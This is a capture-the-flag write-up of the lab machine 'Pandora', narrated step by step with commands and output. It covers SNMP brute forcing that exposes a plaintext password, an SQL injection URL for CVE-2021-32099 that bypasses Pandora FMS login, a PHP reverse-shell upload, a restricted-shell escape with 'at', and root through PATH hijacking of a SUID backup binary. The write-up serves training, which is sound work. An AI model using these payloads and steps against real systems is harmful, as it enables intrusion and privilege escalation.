## Objectives
- User Own
- System Own

<br>

## Initial Enumeration

#### Rustscan -> Nmap Scan

`sudo rustscan --range 1-65535 --ulimit 5000 -a 10.10.11.136 -- -sC -sV`

```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
```

I also later scanned against UDP ports:

```
PORT      STATE  SERVICE VERSION
161/udp   open   snmp    SNMPv1 server; net-snmp SNMPv3 server (public)
502/udp   closed mbap
17018/udp closed unknown
18255/udp closed unknown
24511/udp closed unknown
49155/udp closed unknown
49173/udp closed unknown
Service Info: Host: pandora
```

<br>

#### Gobuster Scan

`gobuster dir -u http://10.10.11.136 -t 100 -r -x php,txt,html -w dir-med.txt`

```
/assets               (Status: 200) [Size: 1691]
/index.html           (Status: 200) [Size: 33560]
```

<br>

## Website Digging

The main page of the website:

![](images/pandora1.png)

<br>

I manually check around the webpage by viewing the source code, clicking all of the links, visiting the /assets folder, and checking for cookies but don't find anything useful.

There's a section at the bottom that let's you send a message with input fields but it doesn't do anything and checking for SQLi is unsuccessful as well.

There are 6 possible crediential names though:

```
support@panda.htb
contact@panda.htb
Adam Gelius
Sabo Masties
Margin Gesmu
William Smith
```

I don't find much else to go on so I decide to check out the open SNMP port.

<br>

## SNMP Community String

I refer to [**the Hacktricks SNMP guide**](https://book.hacktricks.xyz/pentesting/pentesting-snmp) and find that before we can do much with SNMP we'll need to know the community string or we can't authenticate.

There are several tools available for brute forcing the community string such as nmap, metasploit, onesixtyone, and hydra. I choose to use hydra with the following command that specifies a dictionary with common snmp community strings in it:

`hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt 10.10.11.136 snmp`

```
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-03-22 15:29:25
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 118 login tries (l:1/p:118), ~8 tries per task
[DATA] attacking snmp://10.10.11.136:161/
[161][snmp] host: 10.10.11.136   password: public
[STATUS] attack finished for 10.10.11.136 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-03-22 15:29:36
```

And we find that the community string is simply set to **public**, so that was easy.

<br>

## SNMP Enumeration

We can now use a tool called **snmp-check** to enumerate SNMP further to see what information we can find. I run the following:

`snmp-check 10.10.11.136 -c public > test.txt`


```
819                   runnable              sh                    /bin/sh               -c sleep 30; /bin/bash -c '/usr/bin/host_check -u daniel -p HotelBabylon23'
1134                  runnable              host_check            /usr/bin/host_check   -u daniel -p HotelBabylon23
```

A lot of information is returned, but those lines found in the processes section stood out because it looks like a username and password being supplied as arguments.

<br>

## Daniel

I try and **SSH** over with the credentials found and we're successfully able to login to the system:

`ssh daniel@10.10.11.136`

```
The authenticity of host '10.10.11.136 (10.10.11.136)' can't be established.

<br>

## System Enumeration

I check in the **daniel home directory** and there isn't anything useful, not even the standard user.txt file so we'll see where that ends up being.

He also does not have anything listed under `sudo -l`.

Other than root the following users are on the system:

```
matt:x:1000:1000:matt:/home/matt:/bin/bash
daniel:x:1001:1001::/home/daniel:/bin/bash
```

Looking in the matt home directory shows that a user.txt file is there but we don't have read permissions. I don't see anything else useful in his home directory.

I check out all the website files in **/var/www/html** and don't find anything helpful.

File capabilities come back normal, but there is a non-standard **SUID** file called that the **matt user** has access to run:

```
-rwsr-x--- 1 root matt 16816 Dec  3 15:58 /usr/bin/pandora_backup
```

I look in **/var/backups** to see what the output of that pandora_backup might be but don't see anything there.

Running `id` for daniel and matt shows nothing special:

```
uid=1001(daniel) gid=1001(daniel) groups=1001(daniel)
uid=1000(matt) gid=1000(matt) groups=1000(matt)
```

There is no **/opt** directory on the system to check out. Nothing in **/tmp**.

I search the system for all files owned by daniel and don't find anything useful.

I look back in the **/var/www** directory and notice a folder called **pandora**, so it looks like there could be another website on this server.

I find an SQL database running there, but am unable to login with daniel's credentials, and I don't have access to view the .conf file.

Looking in **/etc/hosts**:

```
127.0.0.1 localhost.localdomain pandora.htb pandora.pandora.htb
127.0.1.1 pandora
```

So that confirms we have another website to check out and we'll need to use some **SSH tunneling** to get to it. I run this and login:

`ssh -D 7777 daniel@10.10.11.136`

Then in my web browser I create a new Socks5 proxy in FoxyProxy and point it to port 7777.

Finally, I add the following to my **/etc/hosts** file and open my webbrowswer to **localhost.localdomain**.

```
10.10.11.136	localhost.localdomain
```

## More Website Digging

We arrive on a page called Pandora FMS, which stands for Flexible Monitoring System according to the title bar. It has a version number at the bottom of the page:

```
v7.0NG.742_FIX_PERL2020
```

There's also a login form and a docs and support link that take you to the actual Pandora FMS products site.

![](images/pandora2.png)

<br>

I search for vulnerabilities on this version of Pandora FMS and find a few. One in particular, **CVE-2021-32099**, looks promising since most of the other ones require us to already be authenticated. It's an **SQLi attack** against the **chart_generator.php** file. Going to the URL they listed told me I did not have access, but when I pressed the back button to get to the main **index.php** page I found myself logged in as admin.

This is the link I used:

```
http://localhost.localdomain/pandora_console/include/chart_generator.php?session_id=a%27%20UNION%20SELECT%20%27a%27,1,%27id_usuario%7Cs:5:%22admin%22;%27%20as%20data%20FROM%20tsessions_php%20WHERE%20%271%27=%271
```

And the admin panel of the website:

![](images/pandora3.png)

<br>

I check out the **Workspace -> Edit my user** menu and it allows me to change the password for admin, which I do so it's easier to get back in if needed. It doesn't ask for the current password to do this.

![](images/pandora4.png)

<br>

## Matt

Looking around the menu for a bit leads me to try several different things but ultimately I end up in the **Admin tools -> File manager** menu which has a lot of images in it. I try and navigate over to [**localhost.localdomain/pandora_console/images/**](localhost.localdomain/pandora_console/images/) in another tab and it works. The images displayed in the menu also show up in the other tab, so if we upload a file we know how to navigate to it.

Looking back in the menu there is a file upload option and I upload a **php reverse shell**, which it lets me do without any filter issues. It was even nice enough to highlight it in red making it easier for me to find, thank you Pandora FMS, you're too kind!

![](images/pandora5.png)

<br>

I then navigate over to the file in my other tab and click on it:

![](images/pandora6.png)

<br>

And I get a reverse shell back as **user matt**:

```

uid=1000(matt) gid=1000(matt) groups=1000(matt)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
matt
```

I upgrade my shell since it's non interactive.

<br>

## More System Enumeration

I head over to the **matt home directory** and find the **user.txt** flag waiting for me, which I'm able to view.

`wc -c user.txt`

```
33 user.txt
```

I remember the file I found earlier that had matt set as the group and ran as root called:

```
-rwsr-x--- 1 root matt 16816 Dec  3 15:58 /usr/bin/pandora_backup
```

When trying to run it I got:

```
PandoraFMS Backup Utility
Now attempting to backup PandoraFMS client
tar: /root/.backup/pandora-backup.tar.gz: Cannot open: Permission denied
tar: Error is not recoverable: exiting now
Backup failed!
Check your permissions!
```

Let's see if we exploit the path and run our own "tar" command, which will run as root:

`touch tar`

`echo /bin/bash > tar`

`chmod +x tar`

`export PATH=/home/matt:$PATH`

`$PATH`

```
bash: /home/matt:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin: No such file or directory
```

Running the backup does take us to another shell, just not a root shell, and we're still running as matt.

<br>

## Restricted Shell

I do some further investigation and it looks like we are in a restricted shell that prevented our previous escalation attempt to root. Running `sudo -l` shows us:

```
sudo: PERM_ROOT: setresuid(0, -1, -1): Operation not permitted
sudo: unable to initialize policy plugin
```

I google search for ways to escape from restricted shells and end up finding the **at** command can be used for this. On the [**GTFOBins site**](https://gtfobins.github.io/gtfobins/at/) it explains you can run the following command:

`echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | at now; tail -f /dev/null`

```
warning: commands will be executed using /bin/sh
job 2 at Wed Mar 23 18:21:00 2022
/bin/sh: 0: can't access tty; job control turned off
$ whoami
matt
```

I fix my shell:

`python3 -c 'import pty;pty.spawn("/bin/bash")'`

`export TERM=xterm-256color`

And now when I run `sudo -l` I get the standard behavior:

```
matt@pandora:/home/matt$ sudo -l
[sudo] password for matt: 
```

<br>

## Root

I go ahead and run the backup program again:

`/usr/bin/pandora_backup`

And it uses the tar command I created previously which drops me right into a root shell:

```
matt@pandora:/home/matt$ /usr/bin/pandora_backup 
PandoraFMS Backup Utility
Now attempting to backup PandoraFMS client
root@pandora:/home/matt# whoami
root
```

Heading over to **/root** I grab the **root.txt** flag:

`wc -c root.txt`

```
33 root.txt
```

<br>

With that we've completed this CTF! It was a long one but a lot of fun to go through.

## Conclusion

A quick run down of what we covered in this CTF:

- Basic enumeration with **rustscan** and **gobuster**
- Using **hydra** to brute force an SNMP community string
- Running **snmp-check** to enumerate SNMP and find login credentials
- Identifying another internal facing website and using **ssh tunneling** to connect to it
- Using **CVE-2021-32099** to login as admin on the **Pandora FMS** website
- Uploading a **PHP reverse shell** and getting the website to connect back to us
- Escaping a **restricted shell** using **at**
- Root privilege escalation by **creating our own tar command** that invokes a shell when the SUID backup program calls it, because it doesn't use an absolute path when running the actual tar command
